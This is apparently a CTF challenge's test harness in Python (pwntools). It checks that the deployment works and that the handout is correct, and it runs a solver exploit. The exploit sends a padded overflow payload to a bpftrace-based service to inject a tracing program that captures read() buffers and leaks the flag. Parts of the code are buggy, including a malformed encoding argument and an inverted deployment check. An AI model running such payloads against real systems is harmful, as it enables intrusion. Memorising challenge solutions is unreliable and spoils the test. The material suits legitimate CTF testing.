#!/usr/bin/env python3
from pwn import *
import argparse
import filecmp
import json
import re
import os
import socket

context.log_level = 'error'

def send_cmd(cmd, io):
    os.write(1, io.recvuntil(b"> "))
    print(cmd + b"\n")
    io.send(cmd + b"\n")

def config_custom(i, payload, io):
    if(len(payload) > 475):
        raise Exception("payload too big")

    send_cmd(b"q " + bytes(str(i), encoding="ascii" + "\n"), io)
    os.write(1, io.recvuntil(b"please input the bpftrace code\n"))
    if(len(payload) != 475):
        io.send(payload + b"\n")
    else:
        io.send(payload)

def attack(io):
    send_cmd(b"c /bin/sh", io)
    send_cmd(b"c /bin/bash", io)
    send_cmd(b"c /usr/bin/nc", io)

    send_cmd(b"a 0", io)
    send_cmd(b"a 1", io)
    send_cmd(b"a 2", io)
    # send_cmd(b"r 0")
    # send_cmd(b"r 1")

    malicious_bpftrace = b"""tracepoint:syscalls:sys_enter_read{@ld = args.buf;}
tracepoint:syscalls:sys_exit_read{ @m[tid] = str(@ld)}""".replace(b"\n", b" ")

    # config_custom(7, tail_block)

    prepad = 299 * b"a"
    malicious_block = b"N" # is_custom
    malicious_block += b"malicious" + ((20 - len(b"malicious")) * b".") # name padding
    malicious_block += malicious_bpftrace #code

    payload = prepad + malicious_block
    payload += b" //"
    payload += (475 - len(payload)) * b"p"


    print(len(payload))
    print(payload)

    config_custom(1, payload, io)

    # config_custom(1, b"a" * 400)

    print("READY\n")

    # p (void*)0x4aaf00 - ((void*)&defenses[1].code)

    send_cmd(b"r 1", io)
    send_cmd(b"s", io)

    # io.interactive()
    output = io.recvall()
    print(output)

    return output


def run_test(flag, connection_string=None, handout_path=None, deployment_path=None, force_reusability=False):
    result = {}
    connection_string = connection_string[0] # We only have a single connection string
    host = connection_string.split(" ")[1]
    port = connection_string.split(" ")[2]

    # If the challenge is in good working order (DEPLOYMENT_WORKING)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    res = sock.connect_ex((host, int(port)))
    
    if (res == 0):
        sock.close()
        io = remote(host, int(port))
        if "Welcome to the command loop. Type 'exit' or 'e' to quit." in io.recvline().decode('ascii'):
            result["DEPLOYMENT_WORKING"] = ""
        else:
            result["DEPLOYMENT_WORKING"] = "Challenge banner missing"
        io.close()    
    else:
        result["DEPLOYMENT_WORKING"] = "Connection failed"

    # If the deployed flag and the stored flag (pass as function parameter) match (FLAG_CORRECT)
    if result["DEPLOYMENT_WORKING"]:
        result["FLAG_CORRECT"] = "Unable to check flag"
    else:
        io = remote(host, int(port))
        output = attack(io)
        
        #output
        matches = re.findall( r"CTF\{.*?\}", output.decode("ascii"))
        if flag.encode() in output:
            result["FLAG_CORRECT"] = ""
        elif matches:
            result["FLAG_CORRECT"] = "Found different flag: " + " ".join(matches)
        else:
            result["FLAG_CORRECT"] = "Flag not found in output"

    # All required handout files are present, and match the deployment (HANDOUT_CORRECT)
    if not {"roomba_ids.c", "Dockerfile"}.issubset(set(os.listdir(handout_path))):
        result["HANDOUT_CORRECT"] = "Missing challenge.c or Dockerfile in handout"
    else:
        _, missmatch, _ = filecmp.cmpfiles(handout_path, deployment_path,
                                           ["challenge.c", "Dockerfile"], shallow=False)
        result["HANDOUT_CORRECT"] = ''.join(missmatch)


    # Assert that all credentials/flags in the handout files are invalid (DUMMY_SECRET)
    result["DUMMY_SECRET"] = grep_recursive("CTF{", handout_path)

    return result


def grep_recursive(pattern, path):
    """
    Recursively search for a pattern in all files within a given directory.

    :param pattern: The regex pattern to search for.
    :param path: The directory path to search in.
    """
    result = ""
    compiled_pattern = re.compile(pattern)

    for root, _, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line_number, line in enumerate(f, start=1):
                        if compiled_pattern.search(line):
                            result += f"{file_path}:{line_number}:{line.strip()}\n"
            except Exception as e:
                print(f"Error reading {file_path}: {e}")

    return result

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Run the test with specified arguments.")

    parser.add_argument("--flag", type=str, required=True, help="The flag to run the test.")
    parser.add_argument("--connection-string", type=str, required=True, action='append',
                        help="The connection string in the form: \"<ip/hostname> <port>\"" +
                        "an example includes: --connection-string \"localhost 1337\" or" +
                        "--connection-string \"172.18.0.1 6564\"")
    parser.add_argument("--handout-path", type=str, required=True, help="The path" +
    " the /Handout dir of the challenge.")
    parser.add_argument("--deployment-path", type=str, required=True, help="The " +
    "path to the /Source directory of this challenge.")

    parser.add_argument("--force-reusability", action="store_true", help="This " +
    "flag is used when testing the challenge before it is given to the player."
    "After test is run with this flag, no artifacts should be left around"
    "that can affect the players experience")
    args = parser.parse_args()

    print(json.dumps(
        run_test(
            flag=args.flag,
            connection_string=args.connection_string,
            handout_path=args.handout_path,
            deployment_path=args.deployment_path,
            force_reusability=args.force_reusability
        )
    ))
